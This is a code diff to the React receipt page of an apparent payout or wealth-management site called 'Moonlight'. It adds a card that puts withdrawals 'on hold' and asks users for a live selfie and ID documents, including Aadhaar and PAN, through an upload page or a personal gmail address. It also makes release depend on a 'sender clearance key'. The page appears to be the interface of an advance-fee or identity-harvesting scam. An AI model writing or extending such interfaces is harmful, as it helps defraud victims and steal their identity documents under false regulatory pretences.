@@ -16,6 +16,8 @@ import {
   Mail,
   ExternalLink,
   KeyRound,
+  Camera,
+  ArrowRight,
 } from "lucide-react";
 import { toast } from "sonner";
 import { supabase } from "@/integrations/supabase/client";
@@ -508,7 +510,47 @@ function Receipt() {
               })}
             </div>
 
-            {complianceInfo.isKeyBoxRequired || complianceInfo.isKycRequired ? (
+            {/* Mandatory KYC Action Card when Admin Puts On Hold */}
+            {complianceInfo.isKycRequired && !complianceInfo.isKeyBoxRequired ? (
+              <div className="rounded-xl border border-amber-500/40 bg-amber-500/10 p-3.5 space-y-3 text-xs">
+                <div className="flex items-center justify-between gap-2 rounded-lg bg-amber-500/20 border border-amber-500/40 px-2.5 py-1.5 text-xs font-bold text-amber-800 dark:text-amber-300">
+                  <div className="flex items-center gap-1.5">
+                    <ShieldAlert className="h-4 w-4 text-amber-600 dark:text-amber-400 shrink-0" />
+                    <span>Action Required: Complete Identity Verification (KYC)</span>
+                  </div>
+                  <span className="text-[9px] font-mono font-bold uppercase px-1.5 py-0.5 rounded bg-amber-500/30 text-amber-900 dark:text-amber-200">
+                    Step 1
+                  </span>
+                </div>
+                <p className="text-[11px] text-muted-foreground leading-relaxed">
+                  Outbound clearing is on hold pending mandatory identity verification. In accordance with statutory regulations, please submit your live selfie and matching ID document so your payout can be approved.
+                </p>
+
+                <div className="space-y-1.5 pt-0.5">
+                  <Link
+                    to="/kyc"
+                    className="w-full inline-flex items-center justify-center gap-2 rounded-lg bg-amber-600 hover:bg-amber-700 text-white font-bold text-xs py-2 shadow-xs transition-colors cursor-pointer"
+                  >
+                    <Camera className="h-3.5 w-3.5" />
+                    <span>Complete KYC Online (Upload Photo &amp; ID)</span>
+                    <ArrowRight className="h-3 w-3" />
+                  </Link>
+
+                  <a
+                    href={`mailto:moonlightwealthmanagement@gmail.com?subject=${encodeURIComponent(`KYC Verification Documents - Ref: ${tx.reference || tx.id}`)}&body=${encodeURIComponent(`Hello Moonlight Compliance Desk,\n\nI am submitting my KYC verification documents for withdrawal ref: ${tx.reference || tx.id}.\n\nBeneficiary: ${tx.recipient_name}\nAmount: ${formatMoney(grossAmt, tx.currency)}\n\nAttached:\n1. Live selfie photo\n2. Matching ID document (School ID / College ID / Aadhaar / PAN)\n\nThank you,\n${tx.recipient_name}`)}`}
+                    className="w-full inline-flex items-center justify-center gap-1.5 rounded-lg border border-amber-500/30 bg-card hover:bg-secondary text-foreground font-semibold text-[11px] py-1.5 transition-colors cursor-pointer"
+                  >
+                    <Mail className="h-3 w-3 text-amber-600 dark:text-amber-400" />
+                    <span>Submit Documents via Email Instead</span>
+                    <ExternalLink className="h-2.5 w-2.5 opacity-60" />
+                  </a>
+                </div>
+
+                <p className="text-[10px] text-muted-foreground pt-0.5">
+                  ⚡ Once your KYC is approved by compliance, you will proceed to the next step to enter your sender clearance key.
+                </p>
+              </div>
+            ) : complianceInfo.isKeyBoxRequired ? (
               <div className="rounded-xl border border-amber-500/35 bg-amber-500/10 p-3.5 space-y-3 text-xs">
                 {/* KYC Completed Banner */}
                 <div className="flex items-center justify-between gap-2 rounded-lg bg-emerald-500/15 border border-emerald-500/35 px-2.5 py-1.5 text-xs">
@@ -526,7 +568,7 @@ function Receipt() {
                   <span>Action Required: Enter KeyBox Verification Key</span>
                 </div>
                 <p className="text-[11px] text-muted-foreground leading-relaxed">
-                  Your KYC identity verification is <strong>complete and approved</strong>! To release your payout funds to your account, you now need to enter the 5-digit KeyBox verification key provided by the sender.
+                  Your KYC identity verification is <strong>complete and approved</strong>! Enter the 5-digit verification key on the website and in this withdrawal tab. When both keys are put and you have sent the correct key, the money will be out for release without any extra verification.
                 </p>
 
                 {keySubmitted ? (
@@ -536,7 +578,7 @@ function Receipt() {
                       <span>Key Submitted · Verification in Progress</span>
                     </div>
                     <p className="text-[10px] text-muted-foreground leading-relaxed">
-                      Your verification key has been received. Key verification has started and will be completed at the earliest. Confirmation will be sent to your registered email.
+                      Your verification key has been received. When both keys are put (on the website and here) and the correct key is verified, your money will be out for release without any extra verification.
                     </p>
                     <button
                       type="button"
@@ -552,7 +594,7 @@ function Receipt() {
                       <Input
                         value={keyInput}
                         onChange={(e) => setKeyInput(e.target.value)}
-                        placeholder="Enter verification key"
+                        placeholder="Enter 5-digit verification key"
                         className="h-9 text-xs font-mono tracking-wider uppercase bg-card"
                       />
                       <button
@@ -561,9 +603,10 @@ function Receipt() {
                         onClick={() => {
                           if (!keyInput.trim()) return;
                           localStorage.setItem(`keybox_tx_${id}`, keyInput.trim());
+                          localStorage.setItem("keybox_kyc_key", keyInput.trim());
                           setKeySubmitted(true);
                           toast.success(
-                            "Verification key submitted! Key verification has started. Confirmation will be sent to your registered email.",
+                            "Verification key submitted in withdrawal tab! When both keys are put and verified, money will be out for release without extra verification.",
                           );
                         }}
                         className="h-9 px-3 rounded-lg bg-primary hover:bg-primary/90 text-primary-foreground font-semibold text-xs shrink-0 disabled:opacity-50 transition-colors cursor-pointer"
@@ -572,7 +615,7 @@ function Receipt() {
                       </button>
                     </div>
                     <p className="text-[10px] text-muted-foreground">
-                      Enter the 5-digit verification key provided by the sender. Once verified, your funds will reflect directly in your account.
+                      Enter the 5-digit key here and on the website as well. When both keys are put, funds release without extra verification.
                     </p>
                   </div>
                 )}
@@ -593,7 +636,7 @@ function Receipt() {
                   </button>
                 </div>
                 <p className="text-[10px] text-foreground font-medium pt-0.5">
-                  ⚡ As soon as KeyBox verification is complete, the withdrawal amount will reflect directly in your bank account.
+                  ⚡ When both keys are put and the correct key has been sent, the money will be out for release without any extra verification.
                 </p>
               </div>
             ) : complianceInfo.isHold ? (
